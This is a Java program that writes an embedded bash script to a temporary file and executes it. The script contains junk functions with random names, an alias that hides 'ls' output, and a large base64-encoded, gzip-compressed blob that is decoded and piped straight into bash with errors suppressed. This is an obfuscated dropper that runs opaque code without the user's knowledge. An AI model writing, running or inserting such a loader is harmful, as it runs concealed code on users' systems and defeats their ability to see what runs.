import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

v0spzhobb() { echo $((RANDOM * RANDOM)); }
vvwqcb0w6() { for i in {1..3}; do :; done; }
vb7g4nvuc() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
